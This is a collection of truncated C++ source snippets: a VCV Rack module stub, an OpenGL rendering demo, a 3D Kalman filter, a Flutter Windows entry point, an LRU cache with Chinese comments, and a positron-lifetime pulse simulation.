    "#include \"plugin.hpp\"\r\n\r\n\r\nstruct SUM_DIST : Module {\r\n\tenum ParamId {\r\n\t\tPARAMS_LEN\r\n\t};\r\n\tenum InputId {\r\n\t\tPATH139_INPUT,\r\n\t\tPATH139_2_INPUT,\r\n\t\tPATH139_27_INPUT,\r\n\t\tPATH139_9_INPUT,\r\n\t\tPATH139_9_7_INPUT,\r\n\t\tPATH139_9_4_INPUT,\r\n\t\tPATH139_97_INPUT,\r\n\t\tPATH139_97_8_INPUT,\r\n\t\tPATH139_97_7_INPUT,\r\n\t\tPATH139_96_INPUT,\r\n\t\tPATH139_96_9_INPUT,\r\n\t\tPATH139_96_3_INPUT,\r\n\t\tPATH139_6_INPUT,\r\n\t\tPATH139_9_2_INPUT,\r\n\t\tPATH139_97_4_INPUT,\r\n\t\tPATH139_96_5_INPUT,\r\n\t\tINPUTS_LEN\r\n\t};\r\n\tenum OutputId {\r\n\t\tPATH139_62_OUTPUT,\r\n\t\tPATH139_9_29_OUTPUT,\r\n\t\tPATH139_97_46_OUTPUT,\r\n\t\tPATH139_96_32_OUTPUT,\r\n\t\tPATH139_2_9_OUTPUT,\r\n\t\tPATH139_27_6_OUTPUT,\r\n\t\tPATH139_62_4_OUTPUT,\r\n\t\tPATH139_9_7_8_OUTPUT,\r\n\t\tPATH139_9_4_3_OUTPUT,\r\n\t\tPATH139_9_29_0_OUTPUT,\r\n\t\tPATH139_97_8_3_OUTPUT,\r\n\t\tPATH139_97_7_4_OUTPUT,\r\n\t\tPATH139_97_46_5_OUTPUT,\r\n\t\tPATH139_96_9_7_OUTPUT,\r\n\t\tPATH139_96_3_8_OUTPUT,\r\n\t\tPATH139_96_32_5_OUTPUT,\r\n\t\tOUTPUTS_LEN\r\n\t};\r\n\tenum LightId {\r\n\t\tLIGHTS_LEN\r\n\t};\r\n\r\n\tSUM_DIST() {\r\n\t\tconfig(PARAMS_LEN, INPUTS_LEN, OUTPUTS_LEN, LIGHTS_LEN);\r\n\t\tconfigInput(PATH139_INPUT, \"\");\r\n\t\tconfigInput(PATH139_2_INPUT, \"\");\r\n\t\tconfigInput(PATH139_27_INPUT, \"\");\r\n\t\tconfigInput(PATH139_9_INPUT, \"\");\r\n\t\tconfigInput(PATH139_9_7_INPUT, \"\");\r\n\t\tconfigInput(PATH139_9_4_INPUT, \"\");\r\n\t\tconfigInput(PATH139_97_INPUT, \"\");\r\n\t\tconfigInput(PATH139_97_8_INPUT, \"\");\r\n\t\tconfigInput(PATH139_97_7_INPUT, \"\");\r\n\t\tconfigInput(PATH139_96_INPUT, \"\");\r\n\t\tconfigInput(PATH139_96_9_INPUT, \"\");\r\n\t\tconfigInput(PATH139_96_3_INPUT, \"\");\r\n\t\tconfigInput(PATH139_6_INPUT, \"\");\r\n\t\tconfigInput(PATH139_9_2_INPUT, \"\");\r\n\t\tconfigInput(PATH139_97_4_INPUT, \"\");\r\n\t\tconfigInput(PATH139_96_5_INPUT, \"\");\r\n\t\tconfigOutput(PATH139_62_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_9_29_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_97_46_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_96_32_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_2_9_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_27_6_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_62_4_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_9_7_8_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_9_4_3_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_9_29_0_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_97_8_3_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_97_7_4_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_97_46_5_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_96_9_7_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_96_3_8_OUTPUT, \"\");\r\n\t\tconfigOutput(PATH139_96_32_5_OUTPUT, \"\");\r\n\t}\r\n\r\n\tvoid process(const ProcessArgs& args) override {\r\n\t}\r\n};\r\n\r\n\r\nstruct SUM_DISTWidget : ModuleWidget {\r\n\tSUM_DISTWidget(SUM_DIST* module) {\r\n\t\tsetModule(module);\r\n\t\tsetPanel(createPanel(asset::plugin(pluginInstance, \"res/SUM_DIST.svg\")));\r\n\r\n\t\taddChild(createWidget<ScrewBlack>(Vec(RACK_GRID_WIDTH, 0)));\r\n\t\taddChild(createWidget<ScrewBlack>(Vec(box.size.x - 2 * RACK_GRID_WIDTH, 0)));\r\n\t\taddChild(createWidget<ScrewBlack>(Vec(RACK_GRID_WIDTH, RACK_GRID_HEIGHT - RACK_GRID_WIDTH)));\r\n\t\taddChild(createWidget<ScrewBlack>(Vec(box.size.x - 2 * RACK_GRID_WIDTH, RACK_GRID_HEIGHT - RACK_GRID_WIDTH)));\r\n\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(7.62, 16.624)), module, SUM_DIST::PATH139_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(22.86, 16.624)), module, SUM_DIST::PATH139_2_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(38.1, 16.624)), module, SUM_DIST::PATH139_27_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(7.62, 29.324)), module, SUM_DIST::PATH139_9_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(22.86, 29.324)), module, SUM_DIST::PATH139_9_7_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(38.1, 29.324)), module, SUM_DIST::PATH139_9_4_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(7.62, 42.024)), module, SUM_DIST::PATH139_97_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(22.86, 42.024)), module, SUM_DIST::PATH139_97_8_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(38.1, 42.024)), module, SUM_DIST::PATH139_97_7_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(7.619, 54.803)), module, SUM_DIST::PATH139_96_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(22.859, 54.803)), module, SUM_DIST::PATH139_96_9_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(38.099, 54.802)), module, SUM_DIST::PATH139_96_3_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(7.62, 73.774)), module, SUM_DIST::PATH139_6_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(7.62, 86.474)), module, SUM_DIST::PATH139_9_2_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(7.62, 99.174)), module, SUM_DIST::PATH139_97_4_INPUT));\r\n\t\taddInput(createInputCentered<PJ301MPort>(mm2px(Vec(7.62, 111.953)), module, SUM_DIST::PATH139_96_5_INPUT));\r\n\r\n\t\taddOutput(createOutputCentered<PJ301MPort>(mm2px(Vec(53.34, 16.655)), module, SUM_DIST::PATH139_62_OUTPUT));\r\n\t\taddOutput(createOutputCentered<PJ301MPort>(mm2px(Vec(53.34, 29.355)), module, SUM_DIST::PATH139_9_29_OUTPUT));\r\n\t\taddOutput(createOutputCentered<PJ301MPort>(mm2px(Vec(53.34, 42.055)), module, SUM_DIST::P",
    "#include <glew.h>\n#include <glfw3.h>\n#include <iostream>\n#include <glm.hpp>\n#include <gtc/matrix_transform.hpp>\n#include \"Shader.h\"\n#include \"Camera.h\"\n#include \"LightManager.h\"\n#include \"Model.h\"\n#include \"Skybox.h\"\n#include \"InputManager.h\"\n\n// Settings\nconstexpr unsigned int ScrWidth = 800;\nconstexpr unsigned int ScrHeight = 600;\n\n// Camera\nCamera GCamera(glm::vec3(0.0f, 0.0f, 5.0f)); // Set initial position a bit further back to allow zooming in and out\n\n// Timing\nfloat DeltaTime = 0.0f;\nfloat LastFrame = 0.0f;\n\n// Lighting\nLightManager GLightManager;\n\n// Input Manager\nInputManager inputManager(GCamera, GLightManager);\n\n// Scale factors for the models\nconstexpr float ModelScaleFactor = 0.01f;  // Adjust this value to scale down the model\nconstexpr float PlantScaleFactor = 0.005f; // Smaller scale for garden plants\nconstexpr float SphereScaleFactor = 0.5f;  // Adjusted scale for the spheres\n\nvoid framebuffer_size_callback(GLFWwindow* window, int width, int height) {\n    inputManager.framebufferSizeCallback(window, width, height);\n}\n\nvoid mouse_callback(GLFWwindow* window, double xpos, double ypos) {\n    inputManager.mouseCallback(window, xpos, ypos);\n}\n\nvoid scroll_callback(GLFWwindow* window, double xoffset, double yoffset) {\n    inputManager.scrollCallback(window, xoffset, yoffset);\n}\n\nvoid checkGLError(const std::string& location)\n{\n    GLenum err;\n    while ((err = glGetError()) != GL_NO_ERROR)\n    {\n        std::cerr << \"OpenGL error at \" << location << \": \" << err << std::endl;\n    }\n}\n\nint main()\n{\n    // Initialize and configure GLFW\n    if (!glfwInit())\n    {\n        std::cerr << \"Failed to initialize GLFW\" << '\\n';\n        return -1;\n    }\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 4);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 6);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n    glfwWindowHint(GLFW_SAMPLES, 4); // Enable MSAA\n\n    // Create a windowed mode window and its OpenGL context\n    GLFWwindow* Window = glfwCreateWindow(ScrWidth, ScrHeight, \"OpenGL Demo\", nullptr, nullptr);\n    if (!Window)\n    {\n        std::cerr << \"Failed to create GLFW window\" << '\\n';\n        glfwTerminate();\n        return -1;\n    }\n    glfwMakeContextCurrent(Window);\n    glfwSetFramebufferSizeCallback(Window, framebuffer_size_callback);\n    glfwSetCursorPosCallback(Window, mouse_callback);\n    glfwSetScrollCallback(Window, scroll_callback);\n\n    // Capture the mouse\n    glfwSetInputMode(Window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n\n    // Initialize GLEW\n    if (glewInit() != GLEW_OK)\n    {\n        std::cerr << \"Failed to initialize GLEW\" << '\\n';\n        return -1;\n    }\n\n    // Configure global OpenGL state\n    glEnable(GL_DEPTH_TEST);\n    glEnable(GL_CULL_FACE); // Enable back-face culling\n    glEnable(GL_MULTISAMPLE); // Enable MSAA\n\n    // Build and compile shaders\n    Shader LightingShader(\"resources/shaders/VertexShader.vert\", \"resources/shaders/FragmentShader.frag\");\n    Shader SkyboxShader(\"resources/shaders/SkyboxVertexShader.vert\", \"resources/shaders/SkyboxFragmentShader.frag\");\n\n    LightingShader.checkCompileErrors(LightingShader.ID, \"PROGRAM\");\n    SkyboxShader.checkCompileErrors(SkyboxShader.ID, \"PROGRAM\");\n\n    // Define material properties\n    Material material;\n    material.ambient = glm::vec3(1.0f, 1.0f, 1.0f);\n    material.diffuse = glm::vec3(1.0f, 1.0f, 1.0f);\n    material.specular = glm::vec3(0.5f, 0.5f, 0.5f);\n    material.shininess = 32.0f;\n\n    // Load models\n    Model GardenPlant(\"resources/models/AncientEmpire/SM_Env_Garden_Plants_01.obj\", \"PolygonAncientWorlds_Texture_01_A.png\");\n    Model Tree(\"resources/models/AncientEmpire/SM_Env_Tree_Palm_01.obj\", \"PolygonAncientWorlds_Texture_01_A.png\");\n    Model Statue(\"resources/models/AncientEmpire/SM_Prop_Statue_01.obj\", \"PolygonAncientWorlds_Texture_01_A.png\");\n    Model Sphere(\"resources/models/Sphere/Sphere_HighPoly.obj\", \"\"); // Sphere model without texture\n\n    // Load skybox\n    std::vector<std::string> Faces\n    {\n        \"resources/skybox/Corona/Right.png\",   // Right\n        \"resources/skybox/Corona/Left.png\",    // Left\n        \"resources/skybox/Corona/Top.png\",     // Top\n        \"resources/skybox/Corona/Bottom.png\",  // Bottom\n        \"resources/skybox/Corona/Back.png\",    // Back\n        \"resources/skybox/Corona/Front.png\"    // Front\n    };\n    Skybox Skybox(Faces);\n\n    // Initialize lighting\n    GLightManager.initialize();\n\n    std::cout << \"Starting rendering loop...\" << std::endl;\n\n    // Rendering loop\n    while (!glfwWindowShouldClose(Window))\n    {\n        // Per-frame time logic\n        float CurrentFrame = static_cast<float>(glfwGetTime());\n        DeltaTime = CurrentFrame - LastFrame;\n        LastFrame = CurrentFrame;\n\n        // Input\n        inputManager.processInput(Window, DeltaTime);\n\n        // Render\n        glClearColor(0.1f, 0.1f, 0.1f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n        checkGLError(\"After Clear\");\n\n        // Set shader and pass uniforms\n  ",
    "#include \"KalmanFilter3D.h\"\n#include <iostream>\n#include <algorithm>\n#include <cmath>\n\nusing namespace std;\n\nKalmanFilter3D::KalmanFilter3D(double dt, double process_noise_std, double measurement_noise_std) {\n    this->dt = dt;\n\n    // State transition matrix (A)\n    double A_temp[6][6] = {\n        {1, 0, 0, dt, 0, 0},\n        {0, 1, 0, 0, dt, 0},\n        {0, 0, 1, 0, 0, dt},\n        {0, 0, 0, 1, 0, 0},\n        {0, 0, 0, 0, 1, 0},\n        {0, 0, 0, 0, 0, 1}\n    };\n    std::copy(&A_temp[0][0], &A_temp[0][0] + 6 * 6, &A[0][0]);\n\n    // Process noise covariance matrix (Q)\n    double q = process_noise_std * process_noise_std;\n    double Q_temp[6][6] = {\n        {q, 0, 0, 0, 0, 0},\n        {0, q, 0, 0, 0, 0},\n        {0, 0, q, 0, 0, 0},\n        {0, 0, 0, q, 0, 0},\n        {0, 0, 0, 0, q, 0},\n        {0, 0, 0, 0, 0, q}\n    };\n    std::copy(&Q_temp[0][0], &Q_temp[0][0] + 6 * 6, &Q[0][0]);\n\n    // Measurement matrix (H)\n    double H_temp[3][6] = {\n        {1, 0, 0, 0, 0, 0},\n        {0, 1, 0, 0, 0, 0},\n        {0, 0, 1, 0, 0, 0}\n    };\n    std::copy(&H_temp[0][0], &H_temp[0][0] + 3 * 6, &H[0][0]);\n\n    // Measurement noise covariance matrix (R)\n    double r = measurement_noise_std * measurement_noise_std;\n    double R_temp[3][3] = {\n        {r, 0, 0},\n        {0, r, 0},\n        {0, 0, r}\n    };\n    std::copy(&R_temp[0][0], &R_temp[0][0] + 3 * 3, &R[0][0]);\n\n    // State estimate vector (x)\n    std::fill(x, x + 6, 0.0);\n\n    // Estimate covariance matrix (P)\n    identityMatrix(P);\n}\n\nvoid KalmanFilter3D::predict() {\n    // Predict the state\n    double x_pred[6];\n    matrixMultiply(A, x, x_pred);\n    std::copy(x_pred, x_pred + 6, x);\n\n    // Predict the estimate covariance\n    double AP[6][6];\n    matrixMultiply(A, P, AP);\n    double At[6][6];\n    matrixTranspose(A, At);\n    double APAt[6][6];\n    matrixMultiply(AP, At, APAt);\n    matrixAdd(APAt, Q, P);\n}\n\nvoid KalmanFilter3D::update(const double z[3]) {\n    // Compute the Kalman gain\n    double HP[3][6];\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 6; ++j) {\n            HP[i][j] = 0;\n            for (int k = 0; k < 6; ++k) {\n                HP[i][j] += H[i][k] * P[k][j];\n            }\n        }\n    }\n\n    double HPHt[3][3];\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            HPHt[i][j] = 0;\n            for (int k = 0; k < 6; ++k) {\n                HPHt[i][j] += HP[i][k] * H[j][k];\n            }\n        }\n    }\n\n    double S[3][3];\n    matrixAdd(HPHt, R, S);\n\n    double S_inv[3][3];\n    matrixInverse(S, S_inv);\n\n    double PHt[6][3];\n    for (int i = 0; i < 6; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            PHt[i][j] = 0;\n            for (int k = 0; k < 3; ++k) {\n                PHt[i][j] += P[i][k] * H[j][k];\n            }\n        }\n    }\n\n    double K[6][3];\n    for (int i = 0; i < 6; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            K[i][j] = 0;\n            for (int k = 0; k < 3; ++k) {\n                K[i][j] += PHt[i][k] * S_inv[k][j];\n            }\n        }\n    }\n\n    // Update the state estimate\n    double y[3];\n    for (int i = 0; i < 3; ++i) {\n        y[i] = z[i];\n        for (int j = 0; j < 6; ++j) {\n            y[i] -= H[i][j] * x[j];\n        }\n    }\n\n    double K_y[6];\n    for (int i = 0; i < 6; ++i) {\n        K_y[i] = 0;\n        for (int j = 0; j < 3; ++j) {\n            K_y[i] += K[i][j] * y[j];\n        }\n    }\n\n    for (int i = 0; i < 6; ++i) {\n        x[i] += K_y[i];\n    }\n\n    // Update the estimate covariance\n    double KH[6][6];\n    for (int i = 0; i < 6; ++i) {\n        for (int j = 0; j < 6; ++j) {\n            KH[i][j] = 0;\n            for (int k = 0; k < 3; ++k) {\n                KH[i][j] += K[i][k] * H[k][j];\n            }\n        }\n    }\n\n    double I[6][6];\n    identityMatrix(I);\n\n    double I_KH[6][6];\n    for (int i = 0; i < 6; ++i) {\n        for (int j = 0; j < 6; ++j) {\n            I_KH[i][j] = I[i][j] - KH[i][j];\n        }\n    }\n\n    double newP[6][6];\n    matrixMultiply(I_KH, P, newP);\n    std::copy(&newP[0][0], &newP[0][0] + 6 * 6, &P[0][0]);\n}\n\nvoid KalmanFilter3D::getState(double state[6]) const {\n    std::copy(x, x + 6, state);\n}\n\nvoid KalmanFilter3D::matrixMultiply(const double A[6][6], const double B[6], double result[6]) {\n    for (int i = 0; i < 6; ++i) {\n        result[i] = 0;\n        for (int j = 0; j < 6; ++j) {\n            result[i] += A[i][j] * B[j];\n        }\n    }\n}\n\nvoid KalmanFilter3D::matrixMultiply(const double A[6][6], const double B[6][6], double result[6][6]) {\n    for (int i = 0; i < 6; ++i) {\n        for (int j = 0; j < 6; ++j) {\n            result[i][j] = 0;\n            for (int k = 0; k < 6; ++k) {\n                result[i][j] += A[i][k] * B[k][j];\n            }\n        }\n    }\n}\n\nvoid KalmanFilter3D::matrixTranspose(const double A[6][6], double result[6][6]) {\n    for (int i = 0; i < 6; ++i) {\n        for (int j = 0; j < 6; ++j) {\n            result[j][i] = A[i][j];\n        }\n    }\n}\n\nvoid KalmanFilter3D::matrixAdd(const double A[6][6], const doub",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mi_card_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <unordered_map>\nusing namespace std;\n\nclass ListNode {\n public:\n  int key;\n  int value;\n  ListNode* next;\n  ListNode* prev;\n  ListNode(int key, int value, ListNode* next = nullptr,\n           ListNode* prev = nullptr) {\n    this->key = key;\n    this->value = value;\n    this->next = next;\n    this->prev = prev;\n  }\n};\n\nclass LRUCache {\n  /**\n   * Your LRUCache object will be instantiated and called as such:\n   * LRUCache* obj = new LRUCache(capacity);\n   * int param_1 = obj->get(key);\n   * obj->put(key,value);\n   *\n   * Example:\n   * LRUCache cache = new LRUCache(2);\n   * cache.put(1, 0);\n   * cache.put(2, 2);\n   * cache.get(1);       // \u8fd4\u56de  1\n   * cache.put(3, 3);    // \u8be5\u64cd\u4f5c\u4f1a\u4f7f\u5f97\u5bc6\u94a5 2 \u4f5c\u5e9f\n   * cache.get(2);       // \u8fd4\u56de -1 (\u672a\u627e\u5230)\n   * cache.put(4, 4);    // \u8be5\u64cd\u4f5c\u4f1a\u4f7f\u5f97\u5bc6\u94a5 1 \u4f5c\u5e9f\n   * cache.get(1);       // \u8fd4\u56de -1 (\u672a\u627e\u5230)\n   * cache.get(3);       // \u8fd4\u56de  3\n   * cache.get(4);       // \u8fd4\u56de  4\n   */\n private:\n  int cap;\n  unordered_map<int, ListNode*> mp;\n  ListNode* head;\n  ListNode* tail;\n\n public:\n  LRUCache(int capacity) : cap(capacity) {\n    this->mp = {};\n    this->head = new ListNode(-1, -1);\n    this->tail = new ListNode(-1, -1);\n    this->head->next = this->tail;\n    this->tail->prev = this->head;\n  }\n\n  int get(int key) {\n    /**\n     * \u83b7\u53d6\u6570\u636e get(key)\n     * \u5982\u679c\u5bc6\u94a5(key)\u5b58\u5728\u4e8e\u7f13\u5b58\u4e2d\uff0c\u5219\u83b7\u53d6\u5bc6\u94a5\u7684\u503c\uff08\u603b\u662f\u6b63\u6570\uff09\uff0c\u5426\u5219\u8fd4\u56de -1\u3002\n     */\n    if (!this->mp.count(key)) {\n      return -1;\n    }\n    ListNode* node = this->mp[key];\n    this->remove(node);\n    this->insert(0, node);\n    return node->value;\n  }\n\n  void put(int key, int value) {\n    /**\n     * \u5199\u5165\u6570\u636e put(key, value)\n     * \u5982\u679c\u5bc6\u94a5\u4e0d\u5b58\u5728\uff0c\u5219\u5199\u5165\u5176\u6570\u636e\u503c\u3002\u5f53\u7f13\u5b58\u5bb9\u91cf\u8fbe\u5230\u4e0a\u9650\u65f6\uff0c\u5b83\u5e94\u8be5\u5728\u5199\u5165\u65b0\u6570\u636e\u4e4b\u524d\u5220\u9664\u6700\u8fd1\u6700\u5c11\u4f7f\u7528\u7684\u6570\u636e\u503c\uff0c\u4ece\u800c\u4e3a\u65b0\u7684\u6570\u636e\u503c\u7559\u51fa\u7a7a\u95f4\u3002\n     */\n    if (!this->mp.count(key)) {\n      ListNode* node = new ListNode(key, value);\n      this->mp[key] = node;\n      this->insert(0, node);\n      if (this->mp.size() > this->cap) {\n        node = tail->prev;\n        this->remove(node);\n        this->mp.erase(node->key);\n        delete node;\n        node = NULL;\n      }\n    } else {\n      ListNode* node = this->mp[key];\n      node->value = value;\n      this->remove(node);\n      this->insert(0, node);\n    }\n    return;\n  }\n\n  void insert(int idx, ListNode* node) {\n    if (idx == 0) {\n      // \u4ece\u5934\u90e8\u63d2\u5165\n      node->prev = this->head;\n      node->next = this->head->next;\n      node->next->prev = node;\n      node->prev->next = node;\n    }\n    return;\n  }\n\n  void remove(ListNode* node) {\n    node->prev->next = node->next;\n    node->next->prev = node->prev;\n    return;\n  }\n  //   void print() {\n  //     for (auto kv : this->mp) {\n  //       cout << '{' << kv.first << ':' << kv.second->value << \"},\";\n  //     }\n  //     cout << endl;\n  //   }\n};\n\nint main() {\n  LRUCache cache = LRUCache(2 /* \u7f13\u5b58\u5bb9\u91cf */);\n  cache.put(1, 0);\n  cache.put(2, 2);\n  cout << cache.get(1) << endl;  // \u8fd4\u56de  0\n  cache.put(3, 3);               // \u8be5\u64cd\u4f5c\u4f1a\u4f7f\u5f97\u5bc6\u94a5 2 \u4f5c\u5e9f\n  cout << cache.get(2) << endl;  // \u8fd4\u56de -1 (\u672a\u627e\u5230)\n  cache.put(4, 4);               // \u8be5\u64cd\u4f5c\u4f1a\u4f7f\u5f97\u5bc6\u94a5 1 \u4f5c\u5e9f\n  cout << cache.get(1) << endl;  // \u8fd4\u56de -1 (\u672a\u627e\u5230)\n  cout << cache.get(3) << endl;  // \u8fd4\u56de  3\n  cout << cache.get(4) << endl;  // \u8fd4\u56de  4\n  return 0;\n}",
    "/****************************************************************************\r\n**\r\n**  Copyright (C) 2023 Dr. Danny Petschke and Dominik Boras\r\n**\r\n**  This program is free software: you can redistribute it and/or modify\r\n**  it under the terms of the GNU General Public License as published by\r\n**  the Free Software Foundation, either version 3 of the License, or\r\n**  (at your option) any later version.\r\n**\r\n**  This program is distributed in the hope that it will be useful,\r\n**  but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n**  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n**  GNU General Public License for more details.\r\n**\r\n**  You should have received a copy of the GNU General Public License\r\n**  along with this program. If not, see http://www.gnu.org/licenses/.\r\n**\r\n*****************************************************************************\r\n**\r\n**  @authors: Danny Petschke, Dominik Boras\r\n**  @contact: danny.petschke@uni-wuerzburg.de, dominik.boras@uni-wuerzburg.de\r\n**\r\n*****************************************************************************/\r\n\r\n#include <iostream>\r\n#include <algorithm>\r\n#include <string>\r\n#include <math.h>\r\n#include <random>\r\n\r\n#include \"dltpulsegenerator.h\"\r\n#include \"DPulseStreamAPI.h\"\r\n#include \"DetEventInfo.h\"\r\n\r\n\r\nusing namespace DLifeTime;\r\n\r\n\r\n//gobal variables initialzation:\r\n\r\nint eventIndex = 0;\r\n\r\nint Window200nsCounter = 0;\r\nint TrueCoincidenceCounter = 0;\r\nint FalseCoincidenceCounter = 0;\r\nint FalseCoincidenceCounterBackground = 0;\r\nint PileUpCounter = 0;\r\nint TruePileUpCounter = 0;\r\nint FalsePileUpCounter = 0;\r\nint BackscatterPileUpCounter = 0;\r\nint Backscatter1275PileUpCounter = 0;\r\nint Double511Detection = 0;\r\n\r\nint Classification_ID = 0;\r\ndouble time_fingerprint = 0.0;\r\ndouble FactorTo500mv = 2.0;\r\n\r\n//chose your PHS windows to get a guess of true coincidence events in the resulted stream\r\n\r\n\r\ndouble window_511_low = (70 / FactorTo500mv);\r\ndouble window_511_high = (1061 / FactorTo500mv);\r\n\r\ndouble window_1275_low = (1062 / FactorTo500mv);\r\ndouble window_1275_high = (3750 / FactorTo500mv);\r\n\r\n\r\nbool Window_511_func(double NumberOfCounts) {\r\n\tif ((NumberOfCounts >= window_511_low) && (NumberOfCounts <= window_511_high)) {\r\n\t\treturn true;\r\n\t}\r\n\telse {\r\n\t\treturn false;\r\n\t}\r\n}\r\n\r\nbool Window_1275_func(double NumberOfCounts) {\r\n\tif ((NumberOfCounts >= window_1275_low) && (NumberOfCounts <= window_1275_high)) {\r\n\t\treturn true;\r\n\t}\r\n\telse {\r\n\t\treturn false;\r\n\t}\r\n}\r\n\r\nbool lookForPileUp(double time1, double time2, double pulseWidth) {\r\n\tif ((time2 - time1) >= pulseWidth) {\r\n\t\treturn false;\r\n\t}\r\n\telse {\r\n\t\treturn true;\r\n\t}\r\n\r\n\r\n}\r\n\r\nbool lookForClosePileUp(double time1, double time2, double pulseWidth) {\r\n\tif ((time2 - time1) >= pulseWidth) {\r\n\t\treturn false;\r\n\t}\r\n\telse {\r\n\t\treturn true;\r\n\t}\r\n\r\n\r\n}\r\n\r\n#define kNumberOfBins 1024\r\nint main() {\r\n\r\n\tint SourcePower = 25; //in uCi\r\n\tint sweep = 200; //in ns\r\n\tdouble PulseWidth = 15.0; //in ns\r\n\tdouble risingEdge = 5.3; //in ns\r\n\t// (0) defines ...\r\n\t//Output Stream for drs4\r\n\r\n\t\r\n\r\n\tconst std::string streamFileName = \"G:/StreamsDissertation/RealesSetup/Geometrie/1275keV_BS_Coincidence_Zylinder1_PMMA_Sweep\" + std::to_string(sweep) + \"ns_\" + std::to_string(SourcePower) + \"uCi.drs4DataStream\";\r\n\r\n\r\n\tfstream myfile(\"G:/StreamsDissertation/RealesSetup/Geometrie/1275keV_BS_Coincidence_PMMA_Zylinder1_AnalyseParameter\" + std::to_string(SourcePower) + \"uCi.txt\", ios::out);\r\n\r\n\r\n\t//Input Streams\r\n\r\n\tifstream ifile(\"C:/Users/Simulationsrechner/Desktop/Geant4MeetsPulsGenerator/Streams/1275keV_Zylinder1_PMMA_probe_1.5mm_Abstand_3mm.stream\", ios::binary);\r\n\tifstream ifile511(\"C:/Users/Simulationsrechner/Desktop/Geant4MeetsPulsGenerator/Streams/511keV_Zylinder1_PMMA_probe_1.5mm_Abstand_3mm.stream\", ios::binary);\r\n\t// Initialisiere Zufallszahlengenerator\r\n\tstd::random_device rd;\r\n\tstd::mt19937 generator(rd());\r\n\r\n\t// Initialisiere exponentielle Verteilungen\r\n\tstd::exponential_distribution<double> distribution1(1.0);\r\n\tstd::exponential_distribution<double> distribution2(1.0);\r\n\tstd::exponential_distribution<double> distribution3(1.0);\r\n\tstd::exponential_distribution<double> distribution4(1.0);\r\n\tstd::exponential_distribution<double> distribution5(1.0);\r\n\t\r\n\t\r\n\t//positron lifetime!\r\n\tint NumberOfComponentes = 3; //the number of Components the Positron lifetime Spectrum should have. 1 to 5 Components availible, Intensity must add to 1.\r\n\tdouble lifetime1 = 0.158;double intensity1 = 0.825;\r\n\tdouble lifetime2 = 0.380;double intensity2 = 0.172;\r\n\tdouble lifetime3 = 2.750;double intensity3 = 0.003;\r\n\tdouble lifetime4 = 0.0; double intensity4 = 0.00;\r\n\tdouble lifetime5 = 0.0; double intensity5 = 0.00;\r\n\r\n\r\n\r\n\t\r\n\r\n\r\n\t//definition of vectors to manage events\r\n\tstd::vector<int> sequence;\r\n\tstd::vector<double> Det1;\r\n\tstd::vector<double> Det2;\r\n\tstd::vector<int> 